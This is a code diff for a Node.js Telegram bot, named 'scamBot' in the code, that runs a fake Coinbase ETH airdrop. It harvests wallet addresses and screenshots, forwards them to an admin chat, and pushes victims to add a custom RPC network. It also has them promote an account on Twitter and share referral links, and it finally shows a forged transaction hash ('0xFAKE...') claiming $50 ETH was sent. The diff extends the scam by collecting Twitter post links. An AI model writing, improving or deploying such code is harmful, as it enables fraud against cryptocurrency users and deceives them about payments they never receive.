@@ -23,7 +23,7 @@ const updateUser = (id, updates) => {
 };
 const getUserByCode = (code) => Object.values(usersDB).find(u => u.referralCode === code);
 
-// === ESCAPE LINK FOR MARKDOWN ===
+// === ESCAPE LINK ===
 const escapeLink = (code) => `t\\.me/coinbase\\_eth\\_airdrop\\_bot?start=ref_${code}`;
 
 // === RPC GUIDE ===
@@ -36,17 +36,20 @@ Add this network to Coinbase Wallet:
 **Currency:** ETH
 `.trim();
 
-// === SEND TO ADMIN (PHOTO + TEXT) ===
-const sendToAdmin = async (text, photoFileId = null) => {
+// === SEND TO ADMIN (PHOTO + TEXT + LINK) ===
+const sendToAdmin = async (text, photoFileId = null, postLink = null) => {
   try {
+    let caption = text;
+    if (postLink) caption += `\nPost: ${postLink}`;
+
     if (photoFileId) {
       const file = await scamBot.telegram.getFile(photoFileId);
       const fileUrl = `https://api.telegram.org/file/bot${SCAM_BOT_TOKEN}/${file.file_path}`;
       const response = await axios.get(fileUrl, { responseType: 'arraybuffer' });
       const buffer = Buffer.from(response.data);
-      await adminBot.telegram.sendPhoto(ADMIN_CHAT_ID, { source: buffer }, { caption: text, parse_mode: 'Markdown' });
+      await adminBot.telegram.sendPhoto(ADMIN_CHAT_ID, { source: buffer }, { caption, parse_mode: 'Markdown' });
     } else {
-      await adminBot.telegram.sendMessage(ADMIN_CHAT_ID, text, { parse_mode: 'Markdown' });
+      await adminBot.telegram.sendMessage(ADMIN_CHAT_ID, caption, { parse_mode: 'Markdown', disable_web_page_preview: true });
     }
   } catch (err) {
     console.error('ADMIN SEND FAILED:', err.message);
@@ -114,7 +117,7 @@ scamBot.command('leaderboard', (ctx) => {
   ctx.reply(text, { parse_mode: 'Markdown' });
 });
 
-// === /start ===
+// === /start — REF CODE ONCE ===
 scamBot.start(async (ctx) => {
   let user = getUser(ctx.from.id);
   const refCode = ctx.startPayload?.startsWith('ref_') ? ctx.startPayload.slice(4) : null;
@@ -124,12 +127,13 @@ scamBot.start(async (ctx) => {
     user = {
       telegramId: ctx.from.id,
       username: ctx.from.username || 'NoUsername',
-      referralCode: code,
+      referralCode: code,  // FIXED ONCE
       referredBy: refCode,
       stage: 'wallet_ss',
       wallet: null,
       referrals: [],
-      totalEarned: 0
+      totalEarned: 0,
+      twitterPostLink: null
     };
     saveUser(user);
 
@@ -155,7 +159,7 @@ scamBot.start(async (ctx) => {
   ctx.reply(`Drop your Coinbase wallet + screenshot.`, walletKeyboard);
 });
 
-// === BUTTONS & PHOTO ===
+// === BUTTONS ===
 scamBot.action('send_wallet', (ctx) => {
   const user = getUser(ctx.from.id);
   if (!user) return;
@@ -184,15 +188,31 @@ scamBot.on('photo', async (ctx) => {
     user.stage = 'twitter_tasks';
     saveUser(user);
     await sendToAdmin(`*RPC PROOF*\nUser: @${user.username}\nWallet: \`${user.wallet}\``, fileId);
-    ctx.reply(`Follow @BjExchange53077, like pinned, tag 3 friends.`, twitterKeyboard);
+    ctx.reply(
+      `*Twitter Task:*\n` +
+      `1. Follow @BjExchange53077\n` +
+      `2. Like pinned post\n` +
+      `3. *Quote* it\n` +
+      `4. Tag 3 friends\n` +
+      `5. Send your *post link* + screenshot`,
+      twitterKeyboard
+    );
     return;
   }
 
+  // TWITTER PROOF: PHOTO + LINK
   if (user.stage === 'twitter_proof') {
+    const postLink = ctx.message.caption?.match(/https?:\/\/[^\s]+/)?.[0] || 'No link';
+    user.twitterPostLink = postLink;
     user.stage = 'claim_ready';
     saveUser(user);
-    await sendToAdmin(`*TWITTER PROOF*\nUser: @${user.username}\nWallet: \`${user.wallet}\``, fileId);
-    ctx.reply(`*Tasks done!* Claim $50 ETH:`, claimKeyboard);
+
+    await sendToAdmin(
+      `*TWITTER PROOF*\nUser: @${user.username}\nWallet: \`${user.wallet}\`\nPost: ${postLink}`,
+      fileId
+    );
+
+    ctx.reply(`*Tasks verified!* Claim $50 ETH:`, claimKeyboard);
     return;
   }
 
@@ -218,12 +238,16 @@ scamBot.action('send_twitter_proof', (ctx) => {
   if (!user || user.stage !== 'twitter_tasks') return;
   user.stage = 'twitter_proof';
   saveUser(user);
-  ctx.editMessageText(`Send Twitter proof now.`);
+  ctx.editMessageText(`Send *screenshot + your post link* in caption.`, { parse_mode: 'Markdown' });
 });
 
+// === FIXED CLAIM BUTTON ===
 scamBot.action('claim_eth', async (ctx) => {
   const user = getUser(ctx.from.id);
-  if (!user || user.stage !== 'claim_ready') return;
+  if (!user || user.stage !== 'claim_ready') {
+    await ctx.answerCbQuery('Not ready yet.');
+    return;
+  }
 
   user.stage = 'claimed';
   saveUser(user);
@@ -231,7 +255,8 @@ scamBot.action('claim_eth', async (ctx) => {
 
   const txHash = "0xFAKE" + Math.random().toString(16).substr(2, 64);
 
-  ctx.editMessageText(
+  await ctx.answerCbQuery('Claimed!');
+  await ctx.reply(
     `*CLAIMED!* $50 ETH sent to:\n\`\`\`\n${user.wallet}\`\`\`\n\n` +
     `Tx: https://dashboard.tenderly.co/tx/mainnet/${txHash}\n\n` +
     `*Share:*\n${escapeLink(user.referralCode)}`,
